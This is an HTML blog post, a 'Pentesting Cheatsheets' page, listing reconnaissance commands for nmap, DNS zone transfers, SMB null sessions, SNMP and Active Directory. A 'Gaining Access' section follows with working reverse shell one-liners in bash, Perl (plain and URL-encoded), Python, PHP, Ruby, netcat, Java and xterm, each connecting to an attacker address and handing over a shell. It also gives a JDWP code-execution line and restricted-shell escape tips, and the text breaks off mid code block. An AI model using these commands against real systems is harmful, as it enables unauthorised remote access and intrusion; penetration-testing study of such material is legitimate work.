<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Pentesting Cheatsheets" /><meta name="author" content="Sachin" /><meta property="og:locale" content="en" /><meta name="description" content="Reconnaissance / Enumeration" /><meta property="og:description" content="Reconnaissance / Enumeration" /><link rel="canonical" href="/blog/posts/Pentesting-Cheatsheets/" /><meta property="og:url" content="/blog/posts/Pentesting-Cheatsheets/" /><meta property="og:site_name" content="0LiVEr" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-08-09T20:55:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Pentesting Cheatsheets" /><meta name="twitter:site" content="@sachinoliver91" /><meta name="twitter:creator" content="@Sachin" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sachin"},"dateModified":"2021-09-27T21:23:55+08:00","datePublished":"2019-08-09T20:55:00+08:00","description":"Reconnaissance / Enumeration","headline":"Pentesting Cheatsheets","mainEntityOfPage":{"@type":"WebPage","@id":"/blog/posts/Pentesting-Cheatsheets/"},"url":"/blog/posts/Pentesting-Cheatsheets/"}</script><title>Pentesting Cheatsheets | 0LiVEr</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0LiVEr"><meta name="application-name" content="0LiVEr"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" alt="avatar" class="mx-auto"> <img src="/blog/assets/img/common/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/blog/">0LiVEr</a></div><div class="site-subtitle font-italic">Security Reasercher / Reverse Engineer</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/sachinoliver" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/sachinoliver91" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['sachinoliver','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/blog/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/"> Home </a> </span> <span>Pentesting Cheatsheets</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Pentesting Cheatsheets</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Sachin </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 9, 2019, 8:55 PM +0800" >Aug 9, 2019<i class="unloaded">2019-08-09T20:55:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 27, 2021, 6:53 PM +0530" >Sep 27, 2021<i class="unloaded">2021-09-27T21:23:55+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="762 words">4 min read</span></div></div><div class="post-content"><h2 id="reconnaissance--enumeration">Reconnaissance / Enumeration</h2><h3 id="extracting-live-ips-from-nmap-scan">Extracting Live IPs from Nmap Scan</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap 10.1.1.1 <span class="nt">--open</span> <span class="nt">-oG</span> scan-results<span class="p">;</span> <span class="nb">cat </span>scan-results | <span class="nb">grep</span> <span class="s2">"/open"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 2 <span class="o">&gt;</span> exposed-services-ips
</pre></table></code></div></div><h3 id="simple-port-knocking">Simple Port Knocking</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">for </span>x <span class="k">in </span>7000 8000 9000<span class="p">;</span> <span class="k">do </span>nmap <span class="nt">-Pn</span> –host_timeout 201 –max-retries 0 <span class="nt">-p</span> <span class="nv">$x</span> 1.1.1.1<span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><h3 id="dns-lookups-zone-transfers--brute-force">DNS lookups, Zone Transfers &amp; Brute-Force</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>whois domain.com
dig <span class="o">{</span>a|txt|ns|mx<span class="o">}</span> domain.com
dig <span class="o">{</span>a|txt|ns|mx<span class="o">}</span> domain.com @ns1.domain.com
host <span class="nt">-t</span> <span class="o">{</span>a|txt|ns|mx<span class="o">}</span> megacorpone.com
host <span class="nt">-a</span> megacorpone.com
host <span class="nt">-l</span> megacorpone.com ns1.megacorpone.com
dnsrecon <span class="nt">-d</span> megacorpone.com <span class="nt">-t</span> axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -&gt; <span class="nb">set type</span><span class="o">=</span>any -&gt; <span class="nb">ls</span> <span class="nt">-d</span> domain.com
<span class="k">for </span>sub <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>subdomains.txt<span class="si">)</span><span class="p">;</span><span class="k">do </span>host <span class="nv">$sub</span>.domain.com|grep <span class="s2">"has.address"</span><span class="p">;</span><span class="k">done</span>
</pre></table></code></div></div><h3 id="banner-grabbing">Banner Grabbing</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nc <span class="nt">-v</span> <span class="nv">$TARGET</span> 80
telnet <span class="nv">$TARGET</span> 80
curl <span class="nt">-vX</span> <span class="nv">$TARGET</span>
</pre></table></code></div></div><h3 id="kerberos-enumeration">Kerberos Enumeration</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># users</span>
nmap <span class="nv">$TARGET</span> <span class="nt">-p</span> 88 <span class="nt">--script</span> krb5-enum-users <span class="nt">--script-args</span> krb5-enum-users.realm<span class="o">=</span><span class="s1">'test'</span>
</pre></table></code></div></div><h3 id="http-brute-force--vulnerability-scanning">HTTP Brute-Force &amp; Vulnerability Scanning</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">target</span><span class="o">=</span>10.0.0.1<span class="p">;</span> gobuster <span class="nt">-u</span> http://<span class="nv">$target</span> <span class="nt">-r</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php,txt <span class="nt">-t</span> 150 <span class="nt">-l</span> | <span class="nb">tee</span> <span class="nv">$target</span><span class="nt">-gobuster</span>
<span class="nv">target</span><span class="o">=</span>10.0.0.1<span class="p">;</span> nikto <span class="nt">-h</span> http://<span class="nv">$target</span>:80 | <span class="nb">tee</span> <span class="nv">$target</span><span class="nt">-nikto</span>
<span class="nv">target</span><span class="o">=</span>10.0.0.1<span class="p">;</span> wpscan <span class="nt">--url</span> http://<span class="nv">$target</span>:80 <span class="nt">--enumerate</span> u,t,p | <span class="nb">tee</span> <span class="nv">$target</span><span class="nt">-wpscan-enum</span>
</pre></table></code></div></div><h3 id="rpc--netbios--smb">RPC / NetBios / SMB</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>rpcinfo <span class="nt">-p</span> <span class="nv">$TARGET</span>
nbtscan <span class="nv">$TARGET</span>

<span class="c">#list shares</span>
smbclient <span class="nt">-L</span> //<span class="nv">$TARGET</span> <span class="nt">-U</span> <span class="s2">""</span>

<span class="c"># null session</span>
rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nv">$TARGET</span>
smbclient <span class="nt">-L</span> //<span class="nv">$TARGET</span>
enum4linux <span class="nv">$TARGET</span>
</pre></table></code></div></div><h3 id="snmp">SNMP</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c"># Windows User Accounts</span>
snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> <span class="nv">$TARGET</span> 1.3.6.1.4.1.77.1.2.25

<span class="c"># Windows Running Programs</span>
snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> <span class="nv">$TARGET</span> 1.3.6.1.2.1.25.4.2.1.2

<span class="c"># Windows Hostname</span>
snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> <span class="nv">$TARGET</span> .1.3.6.1.2.1.1.5

<span class="c"># Windows Share Information</span>
snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> <span class="nv">$TARGET</span> 1.3.6.1.4.1.77.1.2.3.1.1

<span class="c"># Windows Share Information</span>
snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> <span class="nv">$TARGET</span> 1.3.6.1.4.1.77.1.2.27

<span class="c"># Windows TCP Ports</span>
snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> <span class="nv">$TARGET4</span> 1.3.6.1.2.1.6.13.1.3

<span class="c"># Software Name</span>
snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> <span class="nv">$TARGET</span> 1.3.6.1.2.1.25.6.3.1.2

<span class="c"># brute-force community strings</span>
onesixtyone <span class="nt">-i</span> snmp-ips.txt <span class="nt">-c</span> community.txt

snmp-check <span class="nv">$TARGET</span>
</pre></table></code></div></div><h3 id="smtp">SMTP</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smtp-user-enum <span class="nt">-U</span> /usr/share/wordlists/names.txt <span class="nt">-t</span> <span class="nv">$TARGET</span> <span class="nt">-m</span> 150
</pre></table></code></div></div><h3 id="active-directory">Active Directory</h3><div class="language-text highlighter-rouge"><div class="code-header" text-data="text"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre># current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
</pre></table></code></div></div><h3 id="listen-on-a-port-powershell">Listen on a port (Powershell)</h3><div class="language-csharp highlighter-rouge"><div class="code-header" text-data="csharp"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="err">#</span> <span class="n">Start</span> <span class="n">listener</span> <span class="k">on</span> <span class="n">port</span> <span class="m">443</span>
<span class="err">$</span><span class="n">listener</span> <span class="p">=</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpListener</span><span class="p">]</span><span class="m">443</span><span class="p">;</span> <span class="err">$</span><span class="n">listener</span><span class="p">.</span><span class="nf">Start</span><span class="p">();</span>
 
<span class="k">while</span><span class="p">(</span><span class="err">$</span><span class="k">true</span><span class="p">)</span>
<span class="p">{</span>
    <span class="err">$</span><span class="n">client</span> <span class="p">=</span> <span class="err">$</span><span class="n">listener</span><span class="p">.</span><span class="nf">AcceptTcpClient</span><span class="p">();</span>
    <span class="n">Write</span><span class="p">-</span><span class="n">Host</span> <span class="err">$</span><span class="n">client</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">RemoteEndPoint</span> <span class="s">"connected!"</span><span class="p">;</span>
    <span class="err">$</span><span class="n">client</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
    <span class="n">start</span><span class="p">-</span><span class="n">sleep</span> <span class="p">-</span><span class="n">seconds</span> <span class="m">1</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="gaining-access">Gaining Access</h2><h3 id="reverse-shell-one-liners">Reverse Shell One-Liners</h3><h4 id="bash">Bash</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</pre></table></code></div></div><h4 id="perl">Perl</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>perl <span class="nt">-e</span> <span class="s1">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
</pre></table></code></div></div><h4 id="url-encoded-perl-linux">URL-Encoded Perl: Linux</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span>%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew
</pre></table></code></div></div><h4 id="python">Python</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
</pre></table></code></div></div><h4 id="php">PHP</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</pre></table></code></div></div><h4 id="ruby">Ruby</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ruby <span class="nt">-rsocket</span> <span class="nt">-e</span><span class="s1">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
</pre></table></code></div></div><h4 id="netcat-without--e-1">Netcat without -e #1</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">rm</span> /tmp/f<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f<span class="p">;</span> <span class="nb">cat</span> /tmp/f | /bin/sh <span class="nt">-i</span> 2&gt;&amp;1 | nc 10.0.0.1 1234 <span class="o">&gt;</span> /tmp/f
</pre></table></code></div></div><h4 id="netcat-without--e-2">Netcat without -e #2</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nc localhost 443 | /bin/sh | nc localhost 444
telnet localhost 443 | /bin/sh | telnet localhost 444
</pre></table></code></div></div><h4 id="java">Java</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>r <span class="o">=</span> Runtime.getRuntime<span class="o">()</span><span class="p">;</span> p <span class="o">=</span> r.exec<span class="o">([</span><span class="s2">"/bin/bash"</span>,<span class="s2">"-c"</span>,<span class="s2">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do </span><span class="se">\$</span><span class="s2">line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> as String[]<span class="o">)</span><span class="p">;</span> p.waitFor<span class="o">()</span><span class="p">;</span>
</pre></table></code></div></div><h4 id="xterm">XTerm</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>xterm <span class="nt">-display</span> 10.0.0.1:1
</pre></table></code></div></div><h3 id="jdwp-rce">JDWP RCE</h3><div class="language-java highlighter-rouge"><div class="code-header" text-data="java"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">print</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">(</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">InputStreamReader</span><span class="o">(</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"whoami"</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">())).</span><span class="na">readLine</span><span class="o">())</span>
</pre></table></code></div></div><h3 id="working-with-restricted-shells">Working with Restricted Shells</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># rare cases</span>
ssh bill@localhost <span class="nb">ls</span> <span class="nt">-l</span> /tmp
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">nice</span> /bin/bash
</pre></table></code></div></div><h3 id="interactive-tty-shells">Interactive TTY Shells</h3><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/bin/expect sh
</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header" text-data="python"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
